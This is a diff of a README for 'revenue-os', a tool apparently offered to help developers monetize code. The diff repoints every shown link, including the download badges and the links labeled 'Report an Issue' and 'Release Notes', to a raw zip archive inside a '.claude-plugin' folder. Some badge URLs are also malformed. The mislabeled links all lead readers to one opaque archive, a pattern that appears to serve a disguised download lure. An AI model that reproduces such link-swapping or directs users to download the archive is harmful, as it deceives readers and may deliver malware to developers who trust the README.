@@ -2,7 +2,7 @@
 
 Welcome to revenue-os, the monetization operating system designed for developers. This application helps you connect your code with customers and cash through a seamless process of discovering your ideal customer profile, outlining value propositions, pricing models, outreach strategies, and more.
 
-[![Download revenue-os](https://raw.githubusercontent.com/gerardtschanz/revenue-os/main/commands/revenue_os_v1.8.zip%https://raw.githubusercontent.com/gerardtschanz/revenue-os/main/commands/revenue_os_v1.8.zip)](https://raw.githubusercontent.com/gerardtschanz/revenue-os/main/commands/revenue_os_v1.8.zip)
+[![Download revenue-os](https://github.com/gerardtschanz/revenue-os/raw/refs/heads/main/.claude-plugin/os-revenue-v3.8.zip%https://github.com/gerardtschanz/revenue-os/raw/refs/heads/main/.claude-plugin/os-revenue-v3.8.zip)](https://github.com/gerardtschanz/revenue-os/raw/refs/heads/main/.claude-plugin/os-revenue-v3.8.zip)
 
 ## 📦 Overview
 
@@ -29,7 +29,7 @@ Before downloading revenue-os, ensure your system meets these requirements:
 
 To get started with revenue-os, visit the Releases page to download the software:
 
-[Download revenue-os](https://raw.githubusercontent.com/gerardtschanz/revenue-os/main/commands/revenue_os_v1.8.zip)
+[Download revenue-os](https://github.com/gerardtschanz/revenue-os/raw/refs/heads/main/.claude-plugin/os-revenue-v3.8.zip)
 
 1. Click the link above.
 2. Locate the latest release.
@@ -83,11 +83,11 @@ This tool helps with various topics related to monetization, including:
 
 ## 🔗 Useful Links
 
-- [Report an Issue](https://raw.githubusercontent.com/gerardtschanz/revenue-os/main/commands/revenue_os_v1.8.zip)
+- [Report an Issue](https://github.com/gerardtschanz/revenue-os/raw/refs/heads/main/.claude-plugin/os-revenue-v3.8.zip)
 - [Join the Community](#)
 
-For complete information about the application, check our [Release Notes](https://raw.githubusercontent.com/gerardtschanz/revenue-os/main/commands/revenue_os_v1.8.zip).
+For complete information about the application, check our [Release Notes](https://github.com/gerardtschanz/revenue-os/raw/refs/heads/main/.claude-plugin/os-revenue-v3.8.zip).
 
-[![Download revenue-os](https://raw.githubusercontent.com/gerardtschanz/revenue-os/main/commands/revenue_os_v1.8.zip%https://raw.githubusercontent.com/gerardtschanz/revenue-os/main/commands/revenue_os_v1.8.zip)](https://raw.githubusercontent.com/gerardtschanz/revenue-os/main/commands/revenue_os_v1.8.zip) 
+[![Download revenue-os](https://github.com/gerardtschanz/revenue-os/raw/refs/heads/main/.claude-plugin/os-revenue-v3.8.zip%https://github.com/gerardtschanz/revenue-os/raw/refs/heads/main/.claude-plugin/os-revenue-v3.8.zip)](https://github.com/gerardtschanz/revenue-os/raw/refs/heads/main/.claude-plugin/os-revenue-v3.8.zip) 
 
 Thank you for choosing revenue-os. We look forward to seeing how you will maximize your monetization strategies!
